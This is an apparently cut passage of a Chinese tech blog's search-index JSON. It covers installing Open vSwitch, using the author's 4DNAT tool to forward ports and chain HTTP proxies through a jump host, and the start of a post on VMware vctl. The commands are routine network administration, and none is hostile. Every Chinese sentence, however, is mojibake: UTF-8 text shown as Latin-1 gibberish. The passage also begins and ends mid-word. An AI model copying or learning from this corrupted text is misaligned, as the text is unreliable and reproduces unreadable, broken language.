¸å¿ƒåŠŸèƒ½ï¼Œå®šä¹‰äº†ç«¯å£ä¹‹é—´è½¬å‘æ•°æ®æŠ¥æ–‡çš„è§„åˆ™ï¼Œä¸€æ¡æµè¡¨è§„åˆ™ä¸»è¦åˆ†ä¸ºåŒ¹é…å’ŒåŠ¨ä½œä¸¤éƒ¨åˆ†ï¼ŒåŒ¹é…éƒ¨åˆ†å†³å®šå“ªäº›æ•°æ®æŠ¥æ–‡éœ€è¦è¢«å¤„ç†ï¼ŒåŠ¨ä½œå†³å®šäº†åŒ¹é…åˆ°çš„æ•°æ®æŠ¥æ–‡è¯¥å¦‚ä½•å¤„ç†ã€‚\u003c/p\u003e\n\u003ch1 id=\"ovså¸¸ç”¨æ“ä½œ\"\u003eOVSå¸¸ç”¨æ“ä½œ\u003c/h1\u003e\n\u003ch3 id=\"å®‰è£…\"\u003eå®‰è£…\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eyum install openvswitch\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl enable openvswitch\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esystemctl start openvswitch\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cblockquote\u003e\n\u003cp\u003eå¦‚æœå½“å‰è½¯ä»¶æºä¸­æ²¡æœ‰openvswitchï¼Œå¯ä»¥é€šè¿‡\u003ca href=\"https://developer.aliyun.com/packageSearch?word=openvswitch\"\u003eé˜¿é‡Œäº‘å®˜æ–¹é•œåƒç«™\u003c/a\u003eä¸‹è½½å’Œæ“ä½œç³»ç»Ÿç‰ˆæœ¬å¯¹åº”çš„rpmåŒ…åˆ°æœ¬åœ°å†å®‰è£…ã€‚ ç¤ºä¾‹å‘½ä»¤ï¼š \u003ccode\u003eyum localinstall openvswitch-2.9.0-3.el7.x86_64.rpm\u003c/code\u003e\u003c/p\u003e","title":"Open vSwitch å…¥é—¨å®è·µï¼ˆ1ï¼‰Open vSwitch æ˜¯ä»€ä¹ˆ"},{"content":"å‰è¨€ ä½ æ˜¯å¦é‡åˆ°è¿‡è¿™æ ·çš„åœºæ™¯ï¼ŒæœåŠ¡å™¨ä¸èƒ½ä¸Šç½‘ï¼Œä½†æ˜¯åˆéœ€è¦å®‰è£…æŸä¸ªè½¯ä»¶ï¼Œé¢å¯¹å¦‚è››ç½‘èˆ¬æ‚ä¹±çš„rpmåŒ…ä¾èµ–å…³ç³»ï¼Œæ”¾å¼ƒæˆ–è®¸æ˜¯æœ€å¥½çš„é€‰æ‹©ï¼Œè¿™æ ·ä½ å°±ä¸å¿…å†ä¸ºæ— æ³•å®Œæˆå·¥ä½œè€Œç—›è‹¦åˆæ‡Šæ¼ã€‚\nä½†æ˜¯ä»Šå¤©ï¼Œä½ æœ‰äº†ä¸€ä¸ªæ›´å¥½çš„é€‰æ‹©ã€‚\n4DNAT 4DNATå–åæºè‡ª4å’ŒDNATã€‚è¿™ä¸ªå·¥å…·å·¥ä½œåœ¨OSIæ¨¡å‹çš„ç¬¬å››å±‚ä¼ è¾“å±‚ï¼ŒåŒæ—¶4å’Œforè°éŸ³ï¼Œæ„ä¸ºä¸“é—¨ä¸ºç›®æ ‡åœ°å€è½¬æ¢è€ŒæœåŠ¡çš„å·¥å…·ã€‚4DNATä½¿ç”¨goè¯­è¨€å¼€å‘ï¼Œå…·æœ‰å¤©ç„¶çš„è·¨å¹³å°æ€§ï¼Œå¹¶ä¸”å®Œå…¨ä½¿ç”¨goæ ‡å‡†åº“å¼€å‘ï¼Œæ²¡æœ‰ä»»ä½•çš„ç¬¬ä¸‰æ–¹ä¾èµ–ï¼Œç¼–è¯‘ä¹‹ååªæœ‰ä¸€ä¸ªäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ã€‚å®ƒæœ‰4ç§å·¥ä½œæ¨¡å¼ï¼š\nè½¬å‘æ¨¡å¼ æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç›‘å¬ç«¯å£å’Œç›®æ ‡åœ°å€ï¼Œåœ¨ç›‘å¬ç«¯å£æ¥æ”¶åˆ°è¯·æ±‚åä¼šä¸»åŠ¨è¿æ¥ç›®æ ‡åœ°å€ï¼Œç¤ºä¾‹ï¼š\n./4dnat -forward 2222 192.168.1.100:22 ç›‘å¬æ¨¡å¼ æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç›‘å¬ç«¯å£1å’Œç›‘å¬ç«¯å£2ï¼Œå¹¶äº¤æ¢ä¸¤ä¸ªç«¯å£æ¥æ”¶åˆ°çš„æ•°æ®ï¼Œç¤ºä¾‹ï¼š\n./4dnat -listen 10000 10001 ä»£ç†äººæ¨¡å¼ æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç›®æ ‡åœ°å€1å’Œç›®æ ‡åœ°å€2ï¼Œå¯åŠ¨åä¼šä¸»åŠ¨è¿æ¥è¿™ä¸¤ä¸ªç›®æ ‡åœ°å€ï¼Œå¹¶äº¤æ¢ä¸¤ä¸ªç«¯å£æ¥æ”¶åˆ°çš„æ•°æ®ï¼Œç¤ºä¾‹ï¼š\n./4dnat -agent 127.0.0.1:10000 127.0.0.1:22 http/httpsä»£ç†æ¨¡å¼ æ¥å—ä¸¤ä¸ªå‚æ•°æˆ–å››ä¸ªå‚æ•°ï¼Œä»£ç†ç±»å‹ã€ç›‘å¬ç«¯å£ã€è¯ä¹¦è·¯å¾„å’Œç§é’¥è·¯å¾„ï¼Œç¤ºä¾‹ï¼š\nhttpä»£ç† ./4dnat -proxy http 1080 httpsä»£ç† ./4dnat -proxy https 1080 server.crt server.key ä½¿ç”¨åœºæ™¯ åœºæ™¯ä¸€ æœŸæœ›å¯ä»¥åœ¨ç”¨æˆ·ç”µè„‘ä¸Šç›´æ¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨ä¸Šçš„3306ç«¯å£ï¼Œè·³æ¿æœºå™¨æ˜¯ä¸€å°Windowsæœºå™¨ï¼Œæ²¡åŠæ³•åšsshç«¯å£è½¬å‘ã€‚ å•å‘è™šçº¿ç®­å¤´è¡¨ç¤ºå¯ä»¥å•å‘è®¿é—®ï¼Œåä¹‹ä¸è¡Œã€‚\nä½¿ç”¨4DNATåœ¨è·³æ¿æœºå™¨ä¸Šæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤åšç«¯å£è½¬å‘\n# æœ¬åœ°ç›‘å¬3307ç«¯å£ï¼Œæ¥æ”¶åˆ°è¯·æ±‚åä¸»åŠ¨è¿æ¥10.1.0.40çš„3306ç«¯å£ ./4dnat -forward 3307 10.1.0.40:3306 åœ¨ç”¨æˆ·ç”µè„‘ä¸Šè®¿é—®172.16.0.30:3307å³ç­‰åŒäºè®¿é—®10.1.0.40:3306ï¼Œäºæ˜¯å°±å¯ä»¥åœ¨ç”¨æˆ·ç”µè„‘æ„‰å¿«çš„è®¿é—®ç›®æ ‡æœºå™¨ä¸Šçš„æœåŠ¡å•¦ã€‚\nåœºæ™¯äºŒ æœŸæœ›ç›®æ ‡ç›®æ ‡æœºå™¨å¯ä»¥ä¸Šç½‘ï¼Œå¦‚ä½¿ç”¨yumå®‰è£…è½¯ä»¶ã€‚ åœ¨ç”¨æˆ·ç”µè„‘ä¸Šå¼€å¯ä¸€ä¸ªhttpä»£ç† ./4dnat -proxy http 1080 åœ¨è·³æ¿æœºå™¨ä¸Šä½¿ç”¨ç›‘å¬æ¨¡å¼ç›‘å¬ä¸¤ä¸ªç«¯å£ï¼Œç”¨äºäº¤æ¢æ•°æ® ./4dnat -listen 10000 10001 åœ¨ç›®æ ‡æœºå™¨ä¸Šä½¿ç”¨ç›‘å¬æ¨¡å¼ç›‘å¬ä¸¤ä¸ªç«¯å£ï¼Œç”¨äºäº¤æ¢æ•°æ® ./4dnat -listen 20000 20001 åœ¨ç”¨æˆ·ç”µè„‘ä¸Šä½¿ç”¨ä»£ç†äººæ¨¡å¼ä¸»åŠ¨è¿æ¥ä¸¤ä¸ªç›®æ ‡åœ°å€ï¼Œç”¨äºäº¤æ¢æ•°æ® ./4dnat -agent 127.0.0.1:1080 172.16.0.30:10000 åœ¨è·³æ¿æœºå™¨ä¸Šä½¿ç”¨ä»£ç†äººæ¨¡å¼ä¸»åŠ¨è¿æ¥ä¸¤ä¸ªç›®æ ‡åœ°å€ï¼Œç”¨äºäº¤æ¢æ•°æ® ./4dnat -agent 127.0.0.1:10001 10.1.0.40:20000 åœ¨ç›®æ ‡æœºå™¨ä¸Šä¿®æ”¹ä»£ç† cat \u0026lt;\u0026lt;EOF \u0026gt;\u0026gt; /etc/profile http_proxy=http://127.0.0.1:20001 https_proxy=http://127.0.0.1:20001 export http_proxy https_proxy EOF source /etc/profile åœ¨ç›®æ ‡æœºå™¨ä¸Šæµ‹è¯•è®¿é—®äº’è”ç½‘ curl https://typesafe.cn æœ€åå¥‰ä¸Šé¡¹ç›®åœ°å€ https://github.com/dushixiang/4dnat\n","permalink":"https://www.typesafe.cn/posts/4dnat/","summary":"\u003ch1 id=\"å‰è¨€\"\u003eå‰è¨€\u003c/h1\u003e\n\u003cp\u003eä½ æ˜¯å¦é‡åˆ°è¿‡è¿™æ ·çš„åœºæ™¯ï¼ŒæœåŠ¡å™¨ä¸èƒ½ä¸Šç½‘ï¼Œä½†æ˜¯åˆéœ€è¦å®‰è£…æŸä¸ªè½¯ä»¶ï¼Œé¢å¯¹å¦‚è››ç½‘èˆ¬æ‚ä¹±çš„rpmåŒ…ä¾èµ–å…³ç³»ï¼Œæ”¾å¼ƒæˆ–è®¸æ˜¯æœ€å¥½çš„é€‰æ‹©ï¼Œè¿™æ ·ä½ å°±ä¸å¿…å†ä¸ºæ— æ³•å®Œæˆå·¥ä½œè€Œç—›è‹¦åˆæ‡Šæ¼ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯ä»Šå¤©ï¼Œä½ æœ‰äº†ä¸€ä¸ªæ›´å¥½çš„é€‰æ‹©ã€‚\u003c/p\u003e\n\u003ch1 id=\"4dnat\"\u003e\u003ca href=\"https://github.com/dushixiang/4dnat\"\u003e4DNAT\u003c/a\u003e\u003c/h1\u003e\n\u003cp\u003e4DNATå–åæºè‡ª4å’ŒDNATã€‚è¿™ä¸ªå·¥å…·å·¥ä½œåœ¨OSIæ¨¡å‹çš„ç¬¬å››å±‚ä¼ è¾“å±‚ï¼ŒåŒæ—¶4å’Œforè°éŸ³ï¼Œæ„ä¸ºä¸“é—¨ä¸ºç›®æ ‡åœ°å€è½¬æ¢è€ŒæœåŠ¡çš„å·¥å…·ã€‚4DNATä½¿ç”¨goè¯­è¨€å¼€å‘ï¼Œå…·æœ‰å¤©ç„¶çš„è·¨å¹³å°æ€§ï¼Œå¹¶ä¸”å®Œå…¨ä½¿ç”¨goæ ‡å‡†åº“å¼€å‘ï¼Œæ²¡æœ‰ä»»ä½•çš„ç¬¬ä¸‰æ–¹ä¾èµ–ï¼Œç¼–è¯‘ä¹‹ååªæœ‰ä¸€ä¸ªäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ã€‚å®ƒæœ‰4ç§å·¥ä½œæ¨¡å¼ï¼š\u003c/p\u003e\n\u003ch3 id=\"è½¬å‘æ¨¡å¼\"\u003eè½¬å‘æ¨¡å¼\u003c/h3\u003e\n\u003cp\u003eæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç›‘å¬ç«¯å£å’Œç›®æ ‡åœ°å€ï¼Œåœ¨ç›‘å¬ç«¯å£æ¥æ”¶åˆ°è¯·æ±‚åä¼šä¸»åŠ¨è¿æ¥ç›®æ ‡åœ°å€ï¼Œç¤ºä¾‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./4dnat -forward \u003cspan style=\"color:#ae81ff\"\u003e2222\u003c/span\u003e 192.168.1.100:22\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"ç›‘å¬æ¨¡å¼\"\u003eç›‘å¬æ¨¡å¼\u003c/h3\u003e\n\u003cp\u003eæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç›‘å¬ç«¯å£1å’Œç›‘å¬ç«¯å£2ï¼Œå¹¶äº¤æ¢ä¸¤ä¸ªç«¯å£æ¥æ”¶åˆ°çš„æ•°æ®ï¼Œç¤ºä¾‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./4dnat -listen \u003cspan style=\"color:#ae81ff\"\u003e10000\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e10001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"ä»£ç†äººæ¨¡å¼\"\u003eä»£ç†äººæ¨¡å¼\u003c/h3\u003e\n\u003cp\u003eæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç›®æ ‡åœ°å€1å’Œç›®æ ‡åœ°å€2ï¼Œå¯åŠ¨åä¼šä¸»åŠ¨è¿æ¥è¿™ä¸¤ä¸ªç›®æ ‡åœ°å€ï¼Œå¹¶äº¤æ¢ä¸¤ä¸ªç«¯å£æ¥æ”¶åˆ°çš„æ•°æ®ï¼Œç¤ºä¾‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./4dnat -agent 127.0.0.1:10000 127.0.0.1:22\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"httphttpsä»£ç†æ¨¡å¼\"\u003ehttp/httpsä»£ç†æ¨¡å¼\u003c/h3\u003e\n\u003cp\u003eæ¥å—ä¸¤ä¸ªå‚æ•°æˆ–å››ä¸ªå‚æ•°ï¼Œä»£ç†ç±»å‹ã€ç›‘å¬ç«¯å£ã€è¯ä¹¦è·¯å¾„å’Œç§é’¥è·¯å¾„ï¼Œç¤ºä¾‹ï¼š\u003c/p\u003e\n\u003ch4 id=\"httpä»£ç†\"\u003ehttpä»£ç†\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./4dnat -proxy http \u003cspan style=\"color:#ae81ff\"\u003e1080\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"httpsä»£ç†\"\u003ehttpsä»£ç†\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./4dnat -proxy https \u003cspan style=\"color:#ae81ff\"\u003e1080\u003c/span\u003e server.crt server.key\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch1 id=\"ä½¿ç”¨åœºæ™¯\"\u003eä½¿ç”¨åœºæ™¯\u003c/h1\u003e\n\u003ch3 id=\"åœºæ™¯ä¸€\"\u003eåœºæ™¯ä¸€\u003c/h3\u003e\n\u003cp\u003eæœŸæœ›å¯ä»¥åœ¨\u003cstrong\u003eç”¨æˆ·ç”µè„‘\u003c/strong\u003eä¸Šç›´æ¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨ä¸Šçš„3306ç«¯å£ï¼Œè·³æ¿æœºå™¨æ˜¯ä¸€å°Windowsæœºå™¨ï¼Œæ²¡åŠæ³•åšsshç«¯å£è½¬å‘ã€‚\n\u003cimg alt=\"è¯·è¾“å…¥å›¾ç‰‡æè¿°\" loading=\"lazy\" src=\"https://oss.typesafe.cn/break-through-the-network.png\"\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eå•å‘è™šçº¿ç®­å¤´è¡¨ç¤ºå¯ä»¥å•å‘è®¿é—®ï¼Œåä¹‹ä¸è¡Œã€‚\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eä½¿ç”¨4DNATåœ¨\u003cstrong\u003eè·³æ¿æœºå™¨\u003c/strong\u003eä¸Šæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤åšç«¯å£è½¬å‘\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# æœ¬åœ°ç›‘å¬3307ç«¯å£ï¼Œæ¥æ”¶åˆ°è¯·æ±‚åä¸»åŠ¨è¿æ¥10.1.0.40çš„3306ç«¯å£\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./4dnat -forward \u003cspan style=\"color:#ae81ff\"\u003e3307\u003c/span\u003e 10.1.0.40:3306\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåœ¨\u003cstrong\u003eç”¨æˆ·ç”µè„‘\u003c/strong\u003eä¸Šè®¿é—®\u003cstrong\u003e172.16.0.30:3307\u003c/strong\u003eå³ç­‰åŒäºè®¿é—®\u003cstrong\u003e10.1.0.40:3306\u003c/strong\u003eï¼Œäºæ˜¯å°±å¯ä»¥åœ¨\u003cstrong\u003eç”¨æˆ·ç”µè„‘\u003c/strong\u003eæ„‰å¿«çš„è®¿é—®\u003cstrong\u003eç›®æ ‡æœºå™¨\u003c/strong\u003eä¸Šçš„æœåŠ¡å•¦ã€‚\u003c/p\u003e\n\u003ch3 id=\"åœºæ™¯äºŒ\"\u003eåœºæ™¯äºŒ\u003c/h3\u003e\n\u003cp\u003eæœŸæœ›ç›®æ ‡\u003cstrong\u003eç›®æ ‡æœºå™¨\u003c/strong\u003eå¯ä»¥ä¸Šç½‘ï¼Œå¦‚ä½¿ç”¨yumå®‰è£…è½¯ä»¶ã€‚\n\u003cimg alt=\"è¯·è¾“å…¥å›¾ç‰‡æè¿°\" loading=\"lazy\" src=\"https://oss.typesafe.cn/break-through-the-network2.png\"\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eåœ¨\u003cstrong\u003eç”¨æˆ·ç”µè„‘\u003c/strong\u003eä¸Šå¼€å¯ä¸€ä¸ªhttpä»£ç†\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./4dnat -proxy http \u003cspan style=\"color:#ae81ff\"\u003e1080\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003col start=\"2\"\u003e\n\u003cli\u003eåœ¨\u003cstrong\u003eè·³æ¿æœºå™¨\u003c/strong\u003eä¸Šä½¿ç”¨ç›‘å¬æ¨¡å¼ç›‘å¬ä¸¤ä¸ªç«¯å£ï¼Œç”¨äºäº¤æ¢æ•°æ®\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./4dnat -listen \u003cspan style=\"color:#ae81ff\"\u003e10000\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e10001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003col start=\"3\"\u003e\n\u003cli\u003eåœ¨\u003cstrong\u003eç›®æ ‡æœºå™¨\u003c/strong\u003eä¸Šä½¿ç”¨ç›‘å¬æ¨¡å¼ç›‘å¬ä¸¤ä¸ªç«¯å£ï¼Œç”¨äºäº¤æ¢æ•°æ®\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./4dnat -listen \u003cspan style=\"color:#ae81ff\"\u003e20000\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e20001\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003col start=\"4\"\u003e\n\u003cli\u003eåœ¨\u003cstrong\u003eç”¨æˆ·ç”µè„‘\u003c/strong\u003eä¸Šä½¿ç”¨ä»£ç†äººæ¨¡å¼ä¸»åŠ¨è¿æ¥ä¸¤ä¸ªç›®æ ‡åœ°å€ï¼Œç”¨äºäº¤æ¢æ•°æ®\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./4dnat -agent 127.0.0.1:1080 172.16.0.30:10000\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003col start=\"5\"\u003e\n\u003cli\u003eåœ¨\u003cstrong\u003eè·³æ¿æœºå™¨\u003c/strong\u003eä¸Šä½¿ç”¨ä»£ç†äººæ¨¡å¼ä¸»åŠ¨è¿æ¥ä¸¤ä¸ªç›®æ ‡åœ°å€ï¼Œç”¨äºäº¤æ¢æ•°æ®\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./4dnat -agent 127.0.0.1:10001 10.1.0.40:20000\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003col start=\"6\"\u003e\n\u003cli\u003eåœ¨\u003cstrong\u003eç›®æ ‡æœºå™¨\u003c/strong\u003eä¸Šä¿®æ”¹ä»£ç†\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecat \u003cspan style=\"color:#e6db74\"\u003e\u0026lt;\u0026lt;EOF \u0026gt;\u0026gt; /etc/profile\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003ehttp_proxy=http://127.0.0.1:20001\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003ehttps_proxy=http://127.0.0.1:20001\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eexport http_proxy https_proxy\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esource /etc/profile\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003col start=\"7\"\u003e\n\u003cli\u003eåœ¨\u003cstrong\u003eç›®æ ‡æœºå™¨\u003c/strong\u003eä¸Šæµ‹è¯•è®¿é—®äº’è”ç½‘\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl https://typesafe.cn\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæœ€åå¥‰ä¸Šé¡¹ç›®åœ°å€ \u003ca href=\"https://github.com/dushixiang/4dnat\"\u003ehttps://github.com/dushixiang/4dnat\u003c/a\u003e\u003c/p\u003e","title":"æœåŠ¡å™¨ä¸å…è®¸ä¸Šç½‘å¹¶ä¸”éœ€è¦è·³æ¿æœºæ‰èƒ½è®¿é—®ï¼Ÿå­¦ä¼šä½¿ç”¨è¿™ä¸ªå·¥å…·ï¼Œè½»æ¾è®©æœåŠ¡å™¨ä½¿ç”¨yumã€‚"},{"content":"å‰è¨€ ä½œä¸ºä¸€ä¸ªç§°èŒçš„æ‰“å·¥äººï¼Œç”µè„‘ä¸Šå¸¸å¤‡ä¸€ä¸ªVmwareä¸æ˜¯ä»€ä¹ˆæ–°é²œäº‹äº†ï¼Œä½†æ˜¯å®ƒå’ŒDocker for Windowsä¸å…¼å®¹å¾€å¾€å¾ˆè®©äººå¤´å¤§ã€‚é€šè¿‡æŸ¥æ‰¾èµ„æ–™ï¼Œå‘ç°æä¾›çš„è§£å†³æ–¹æ¡ˆå¤§è‡´æœ‰ä¸‰ç§\nå…ˆä½¿ç”¨Vmwareåˆ›å»ºä¸€å°Linuxè™šæ‹Ÿæœºï¼Œåœ¨è¿™å°Linuxè™šæ‹Ÿæœºä¸Šå†å®‰è£…dockerã€‚ é…ç½®Vmwareä½œä¸ºDocker for Windowsçš„è¿è¡Œå¹³å°ã€‚ ä½¿ç”¨å¾®è½¯çš„Hyper-væ¥åˆ›å»ºè™šæ‹Ÿæœºã€‚ å¯¹æˆ‘è€Œè¨€ï¼Œç¬¬ä¸€ç§ä¸å¤ªä¼˜é›…ï¼Œç¬¬äºŒç§é…ç½®ç¹çï¼Œç¬¬ä¸‰ç§ä¸ä¼šç”¨ã€‚\nç›´åˆ°æˆ‘å‘ç°äº†vctlè¿™ä¸ªå¥½ä¸œè¥¿ã€‚\nvctl æ˜¯ä»€ä¹ˆï¼Ÿ vctl æ˜¯ä¸€æ¬¾æ†ç»‘åœ¨Vmware Workstation Pro åº”ç”¨ç¨‹åºä¸­çš„å‘½ä»¤è¡Œå®ç”¨ç¨‹åºï¼Œä»…åœ¨ Windows 10 1809 æˆ–æ›´é«˜ç‰ˆæœ¬ä¸Šå—æ”¯æŒã€‚å¦‚æœ Workstation Pro æ‰€åœ¨ä¸»æœºä¸Šçš„ Windows æ“ä½œç³»ç»Ÿä½äº Windows 10 1809ï¼Œåˆ™å®ƒä¸æ”¯æŒ vctl CLIã€‚\nç®€å•æ¥è¯´å®ƒå°±æ˜¯Vmwareä¸Šçš„ä¸€ä¸ªå·¥å…·ï¼Œå¯ä»¥ç”¨å®ƒæ¥ç®¡ç†å®¹å™¨ï¼Œä½¿ç”¨å‘½ä»¤åŸºæœ¬ä¸Šå’Œdockerä¸€è‡´ï¼Œåªéœ€è¦æŠŠdocker \u0026lt;cmd\u0026gt;æ¢æˆvctl \u0026lt;cmd\u0026gt;å°±è¶³å¤Ÿäº†ã€‚Docker for 